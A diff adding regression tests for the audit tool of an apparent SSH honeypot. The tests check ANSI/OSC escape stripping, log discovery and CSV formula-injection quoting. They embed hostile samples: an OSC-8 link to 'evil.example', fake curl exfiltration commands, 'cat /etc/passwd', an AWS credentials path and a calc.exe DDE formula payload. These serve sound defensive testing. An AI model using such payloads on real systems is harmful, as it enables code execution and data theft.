@@ -57,6 +57,305 @@ def _make_engagement(eid="abc12345-...", user="jdoe", ip="127.0.0.1",
     }
 
 
+class TestANSIEscapeSanitizer:
+    """C-2 regression: attacker-controlled strings (SSH username, command
+    text, planted paths) flow into the operator's terminal via
+    `python tools/audit.py`. Without sanitization an attacker can clear
+    the analyst's screen, hide alerts, smuggle OSC-8 hyperlinks (paste-on-
+    click), or in some xterm builds trigger window-title queries with
+    side effects.
+
+    The _safe() helper must strip ALL escape sequences and C0/C1 control
+    bytes while preserving normal whitespace so multi-line commands and
+    tabbed output stay readable."""
+
+    def test_strips_csi_clear_screen(self):
+        # ESC [ 2 J = clear screen, the textbook deface escape
+        out = audit._safe("hello\x1b[2Jworld")
+        assert "\x1b" not in out
+        assert "[2J" not in out
+        assert "hello" in out and "world" in out
+
+    def test_strips_csi_cursor_move(self):
+        out = audit._safe("\x1b[H\x1b[10;5HEVIL")
+        assert "\x1b" not in out
+        assert "EVIL" in out
+
+    def test_strips_csi_color_sgr(self):
+        # An attacker emitting fake colors to make their commands look benign
+        out = audit._safe("\x1b[32mlooks-green\x1b[0m")
+        assert "\x1b" not in out
+        assert "looks-green" in out
+
+    def test_strips_osc8_hyperlink(self):
+        # OSC 8 hyperlink: \x1b]8;;URL\x07TEXT\x1b]8;;\x07
+        # The most dangerous modern escape — paste-on-click on many terminals.
+        payload = "\x1b]8;;https://evil.example/payload\x07click-me\x1b]8;;\x07"
+        out = audit._safe(payload)
+        assert "\x1b" not in out
+        assert "]8" not in out
+        # Visible text survives — analyst can still see "click-me" but
+        # without the hyperlink machinery.
+        assert "click-me" in out
+
+    def test_strips_osc_window_title(self):
+        # OSC 0 sets the window title — attacker can deface or phish
+        out = audit._safe("\x1b]0;FAKE TITLE\x07real-cmd")
+        assert "\x1b" not in out
+        assert "real-cmd" in out
+
+    def test_strips_bell_and_backspace(self):
+        out = audit._safe("alert\x07\x08\x08\x08silence")
+        assert "\x07" not in out
+        assert "\x08" not in out
+
+    def test_strips_null_byte(self):
+        out = audit._safe("before\x00after")
+        assert "\x00" not in out
+
+    def test_preserves_tab_and_newline(self):
+        # Whitespace controls intentionally preserved — multi-line attacker
+        # commands and tab-aligned output should still render naturally.
+        out = audit._safe("line1\nline2\tcolumn2\rline3")
+        assert "\n" in out
+        assert "\t" in out
+        assert "\r" in out
+
+    def test_strips_c1_8bit_controls(self):
+        # 8-bit C1 controls (\x80-\x9f) — equivalent to ESC + 0x40-0x5f.
+        # Some terminals interpret these even without preceding ESC.
+        out = audit._safe("a\x9bDb")  # CSI (0x9b) equivalent
+        assert "\x9b" not in out
+
+    def test_idempotent(self):
+        once = audit._safe("\x1b[2Jhello")
+        twice = audit._safe(once)
+        assert once == twice
+
+    def test_none_returns_empty_string(self):
+        assert audit._safe(None) == ""
+
+    def test_non_string_coerced(self):
+        # Some attacker-controlled fields may be numeric (timestamps,
+        # counts) — coerce defensively rather than blowing up.
+        assert audit._safe(42) == "42"
+        assert audit._safe([]) == "[]"
+
+
+class TestPrintDetailSanitizesAttackerData:
+    """End-to-end check: build an engagement with an attacker payload in
+    every attacker-controlled field, render via print_detail, and verify
+    no escape sequences reach stdout. This is the integration test for
+    the C-2 fix surface."""
+
+    def test_print_detail_strips_escapes_from_all_attacker_fields(self, capsys):
+        evil = "\x1b[2J\x1b]0;PWNED\x07"
+        eng = _make_engagement(
+            user=f"jdoe{evil}",
+            observed={
+                "credential_search_terms": [f"password{evil}"],
+                "dns_exfil_commands": [f"curl http://evil{evil}.example/x"],
+                "payload_drops": [f"/tmp/{evil}stolen"],
+            },
+            alerts=[{
+                "action": "alert_dns_exfil",
+                "severity": "high",
+                "triggered_by": f"curl{evil} http://example.com",
+                "rationale": f"Exfil attempt{evil} to suspicious host",
+            }],
+            commands=[{
+                "ts": 1_000_000_000.0,
+                "cmd": f"cat{evil} /etc/passwd",
+                "response_source": "vfs-read",
+            }],
+        )
+        eng["cwd"] = f"/home/jdoe{evil}"
+        audit.print_detail(eng)
+        out = capsys.readouterr().out
+        # No escape sequences in any form
+        assert "\x1b" not in out, "ESC byte leaked to operator terminal"
+        assert "\x07" not in out, "BEL byte leaked to operator terminal"
+        assert "PWNED" not in out or out.count("PWNED") == 0, \
+            "OSC window-title payload reached terminal"
+
+
+class TestDockerLogsDiscovery:
+    """Bug #6 regression: `load_engagements` must find session logs in
+    the docker-stack layout (`state-docker/logs/<hostname>/*.json`) as
+    well as the dev-mode flat layout (`logs/*.json`). Pre-fix, the flat
+    glob silently dropped every docker-stack log."""
+
+    def test_iter_log_files_finds_flat_layout(self, tmp_path):
+        # Dev-mode: logs live directly in logs/
+        (tmp_path / "1700000000_aaa.json").write_text("{}", encoding="utf-8")
+        (tmp_path / "1700000001_bbb.json").write_text("{}", encoding="utf-8")
+        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
+        assert found == ["1700000000_aaa.json", "1700000001_bbb.json"]
+
+    def test_iter_log_files_finds_docker_layout(self, tmp_path):
+        # Docker stack: logs live under per-hostname subdirs
+        (tmp_path / "bastion-prod").mkdir()
+        (tmp_path / "bastion-prod" / "1700000000_aaa.json").write_text("{}")
+        (tmp_path / "api-prod-03").mkdir()
+        (tmp_path / "api-prod-03" / "1700000001_bbb.json").write_text("{}")
+        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
+        assert found == ["1700000000_aaa.json", "1700000001_bbb.json"]
+
+    def test_iter_log_files_finds_mixed_layout(self, tmp_path):
+        # Both: a flat file at the top AND files under host subdirs
+        (tmp_path / "1700000000_flat.json").write_text("{}")
+        (tmp_path / "bastion-prod").mkdir()
+        (tmp_path / "bastion-prod" / "1700000001_nested.json").write_text("{}")
+        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
+        assert found == ["1700000000_flat.json", "1700000001_nested.json"]
+
+    def test_iter_log_files_skips_non_json_in_subdirs(self, tmp_path):
+        (tmp_path / "bastion-prod").mkdir()
+        (tmp_path / "bastion-prod" / "real.json").write_text("{}")
+        (tmp_path / "bastion-prod" / "README.md").write_text("not a log")
+        (tmp_path / "bastion-prod" / "stale.txt").write_text("not a log")
+        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
+        assert found == ["real.json"]
+
+    def test_iter_log_files_handles_missing_dir(self, tmp_path):
+        missing = tmp_path / "does-not-exist"
+        assert list(audit._iter_log_files(missing)) == []
+
+    def test_load_engagements_finds_docker_logs(self, tmp_path):
+        """End-to-end: a persistence file plus a docker-layout session
+        log under hostname-subdir must round-trip to produce a fully
+        populated engagement entry with commands + actions."""
+        import time
+        state_dir = tmp_path / "persistence"
+        logs_dir = tmp_path / "logs"
+        state_dir.mkdir()
+        (logs_dir / "bastion-prod").mkdir(parents=True)
+
+        eid = "11111111-2222-3333-4444-555555555555"
+        # Persistence file (engagement metadata)
+        (state_dir / "1.2.3.4__jdoe.json").write_text(json.dumps({
+            "engagement_id": eid,
+            "claimed_user": "jdoe",
+            "source_ip": "1.2.3.4",
+            "first_seen_at": time.time() - 60,
+            "last_seen_at": time.time(),
+            "connection_count": 1,
+            "cwd": "/home/jdoe",
+            "vfs": {"files": {}, "deleted": []},
+            "observed": {},
+        }), encoding="utf-8")
+        # Per-connection log (in the docker layout: under hostname/)
+        (logs_dir / "bastion-prod" / "1700000000_xyz.json").write_text(json.dumps({
+            "engagement_id": eid,
+            "started_at": time.time() - 30,
+            "commands": [{"ts": time.time() - 25, "cmd": "uname -a",
+                          "response_source": "cache"}],
+            "actions_taken": [{
+                "action": "alert_dns_exfil",
+                "severity": "high",
+                "triggered_by": "curl example.com",
+            }],
+        }), encoding="utf-8")
+
+        engs = audit.load_engagements(
+            state_dir, logs_dir, _ROOT / "personas",
+        )
+        assert len(engs) == 1
+        eng = engs[0]
+        assert eng["engagement_id"] == eid
+        assert len(eng["logs"]) == 1, "docker-layout log must be picked up"
+        assert eng["logs"][0]["actions_taken"][0]["action"] == "alert_dns_exfil"
+
+
+class TestCSVFormulaInjection:
+    """C-3 regression: every attacker-controlled cell in IoC CSV export
+    must be prefixed with `'` if it starts with a formula trigger byte
+    (`=`, `+`, `-`, `@`, tab, carriage return). Pre-fix, an attacker who
+    runs `touch /tmp/=cmd|'/c calc.exe'!A0` lands code execution when
+    the analyst opens the IoC CSV in Excel."""
+
+    def test_csv_safe_prefixes_equals(self):
+        assert audit._csv_safe("=cmd|'/c calc.exe'!A0").startswith("'=")
+
+    def test_csv_safe_prefixes_plus(self):
+        assert audit._csv_safe("+1-555-EVIL").startswith("'+")
+
+    def test_csv_safe_prefixes_minus(self):
+        assert audit._csv_safe("-2+3").startswith("'-")
+
+    def test_csv_safe_prefixes_at(self):
+        # @SUM(...) is the LibreOffice/older-Excel formula trigger
+        assert audit._csv_safe("@SUM(1+1)").startswith("'@")
+
+    def test_csv_safe_prefixes_tab(self):
+        # Tab-leading cells in some Excel imports are treated as formulas
+        assert audit._csv_safe("\t=cmd").startswith("'\t")
+
+    def test_csv_safe_preserves_normal_value(self):
+        assert audit._csv_safe("/tmp/normal-payload") == "/tmp/normal-payload"
+
+    def test_csv_safe_strips_embedded_newlines(self):
+        # An attacker payload with newlines could break out of one cell
+        # into the next row, smuggling fake IoC rows into the CSV.
+        s = audit._csv_safe("a\nb\r\nc")
+        assert "\n" not in s and "\r" not in s
+
+    def test_ioc_export_csv_quotes_exfil_domain_starting_with_dash(self):
+        """End-to-end real attack: the URL regex in export_ioc captures
+        hostnames matching `[\\w.-]+`, which allows a leading hyphen.
+        An attacker who runs `curl https://-evil.example/x` produces an
+        exfil_domain value of `-evil.example` — which Excel/Sheets would
+        treat as a formula trigger. The CSV export must prefix it
+        with a single quote."""
+        eng = _make_engagement(
+            observed={
+                "dns_exfil_attempted": True,
+                "dns_exfil_commands": ["curl https://-evil.example/payload"],
+            },
+        )
+        csv_out = audit.export_ioc(eng, as_csv=True)
+        # The dangerous exfil-domain row must have the leading dash
+        # quoted as text rather than parsed as a negative number / formula.
+        assert "'-evil.example" in csv_out, (
+            f"exfil_domain with leading `-` must be CSV-injection-safe; "
+            f"got: {csv_out!r}"
+        )
+        # Header still present
+        assert csv_out.startswith("type,value,severity,")
+
+    def test_ioc_export_csv_preserves_safe_paths(self):
+        """Normal absolute paths (the common case) start with `/` and
+        shouldn't get a stray `'` prefix — the sanitizer is precise about
+        WHICH cells need quoting."""
+        eng = _make_engagement(
+            observed={
+                "payload_drops": ["/tmp/safe", "/tmp/also-safe"],
+                "credential_files_read": ["/home/jdoe/.aws/credentials"],
+            },
+        )
+        csv_out = audit.export_ioc(eng, as_csv=True)
+        assert "/tmp/safe" in csv_out
+        # Should NOT add a leading `'` to safe values
+        assert "'/tmp/" not in csv_out
+        assert "'/home" not in csv_out
+
+    def test_ioc_export_csv_handles_comma_in_path(self):
+        """A path containing `,` would corrupt the row under f-string
+        concatenation. csv.writer must properly quote it."""
+        eng = _make_engagement(
+            observed={"payload_drops": ["/tmp/path,with,commas"]},
+        )
+        csv_out = audit.export_ioc(eng, as_csv=True)
+        # The row should remain parseable as 6 columns
+        import csv as _csv
+        import io as _io
+        rows = list(_csv.reader(_io.StringIO(csv_out)))
+        # Header + at least one data row containing our payload
+        data_rows = [r for r in rows[1:] if r and "path,with,commas" in r[1]]
+        assert len(data_rows) == 1
+        assert len(data_rows[0]) == 6, "row must still have 6 columns"
+
+
 class TestIoCExport:
     def test_basic_structure(self):
         eng = _make_engagement()
